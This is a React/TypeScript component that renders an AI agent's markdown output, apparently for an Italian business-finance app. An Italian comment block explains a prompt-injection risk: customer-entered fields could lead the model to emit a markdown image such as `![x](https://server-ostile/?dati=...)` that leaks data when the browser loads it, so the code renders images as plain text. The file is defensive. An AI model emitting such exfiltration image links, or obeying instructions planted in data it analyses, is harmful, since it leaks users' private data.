'use client';

import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';

// Manual typographic styles for the agent's markdown output (no tailwind
// typography plugin in this project). GFM tables must render with visible
// borders and scroll horizontally on narrow screens.
const components: Components = {
  h1: ({ children }) => (
    <h1 className="font-heading text-xl font-semibold text-foreground mt-6 mb-3 first:mt-0">{children}</h1>
  ),
  h2: ({ children }) => (
    <h2 className="font-heading text-lg font-semibold text-foreground mt-6 mb-3 first:mt-0 border-b border-border pb-1.5">{children}</h2>
  ),
  h3: ({ children }) => (
    <h3 className="font-heading text-base font-semibold text-foreground mt-4 mb-2 first:mt-0">{children}</h3>
  ),
  p: ({ children }) => <p className="text-sm leading-relaxed text-foreground my-2.5">{children}</p>,
  ul: ({ children }) => <ul className="my-2.5 ml-5 list-disc space-y-1 text-sm text-foreground">{children}</ul>,
  ol: ({ children }) => <ol className="my-2.5 ml-5 list-decimal space-y-1 text-sm text-foreground">{children}</ol>,
  li: ({ children }) => <li className="leading-relaxed">{children}</li>,
  strong: ({ children }) => <strong className="font-semibold text-foreground">{children}</strong>,
  em: ({ children }) => <em className="italic">{children}</em>,
  a: ({ children, href }) => (
    <a href={href} target="_blank" rel="noopener noreferrer" className="text-sage-700 underline underline-offset-2 dark:text-sage-300">
      {children}
    </a>
  ),
  // ── SICUREZZA: nessuna immagine scritta dal modello viene mai caricata ──
  // Il testo analizzato contiene campi liberi del cliente (nome cliente nello
  // scadenzario, fornitore nelle spese ricorrenti, categorie importate da CSV):
  // chi scrive quei campi può provare a far emettere al modello un
  // `![x](https://server-ostile/?dati=...)`. Con l'`img` predefinito il browser
  // dell'imprenditore andrebbe a prendere quell'indirizzo DA SOLO, senza che
  // nessuno clicchi, spedendo fuori quello che c'è nella URL.
  //
  // Qui `img` non produce NESSUN tag che carichi una risorsa: rende solo un
  // <span> di testo. Non esiste `src`, quindi non parte nessuna richiesta di
  // rete — non è un filtro sull'indirizzo (che si può aggirare), è l'assenza
  // dell'elemento che sa scaricare.
  //
  // `alt` è testo scritto dal modello: React lo inserisce come nodo di testo e
  // ne fa l'escape, quindi non può reintrodurre markup.
  //
  // PERCHÉ SOLO `img` E NON ANCHE video/audio/iframe/embed/object: quei tag non
  // sono raggiungibili da qui. Senza il plugin rehype-raw (non installato, vedi
  // <ReactMarkdown> in fondo al file) l'HTML grezzo scritto dal modello viene
  // SCARTATO — mdast-util-to-hast/lib/handlers/html.js restituisce `undefined`
  // quando `allowDangerousHtml` è falso. Il markdown puro + GFM sa creare un
  // solo elemento capace di caricare una risorsa esterna, ed è l'immagine.
  img: ({ alt }) => (
    <span className="my-2 inline-block rounded border border-border bg-muted px-2 py-1 text-xs text-fg-2">
      {alt ? `[immagine rimossa: ${alt}]` : '[immagine rimossa]'}
    </span>
  ),
  hr: () => <hr className="my-5 border-border" />,
  blockquote: ({ children }) => (
    <blockquote className="my-3 border-l-2 border-sage-500/50 pl-4 text-sm italic text-fg-2">{children}</blockquote>
  ),
  code: ({ children }) => (
    <code className="rounded bg-muted px-1.5 py-0.5 font-mono text-[12.5px] text-foreground">{children}</code>
  ),
  pre: ({ children }) => (
    <pre className="my-3 overflow-x-auto rounded-md bg-muted p-3 font-mono text-[12.5px] text-foreground">{children}</pre>
  ),
  table: ({ children }) => (
    <div className="my-4 overflow-x-auto">
      <table className="w-full border-collapse text-sm">{children}</table>
    </div>
  ),
  thead: ({ children }) => <thead className="bg-muted">{children}</thead>,
  th: ({ children }) => (
    <th className="border border-border px-3 py-2 text-left font-semibold text-foreground">{children}</th>
  ),
  td: ({ children }) => (
    <td className="border border-border px-3 py-2 text-foreground tabular-nums">{children}</td>
  ),
};

export function AnalysisMarkdown({ text }: { text: string }) {
  return (
    <div className="max-w-none">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
        {text}
      </ReactMarkdown>
    </div>
  );
}
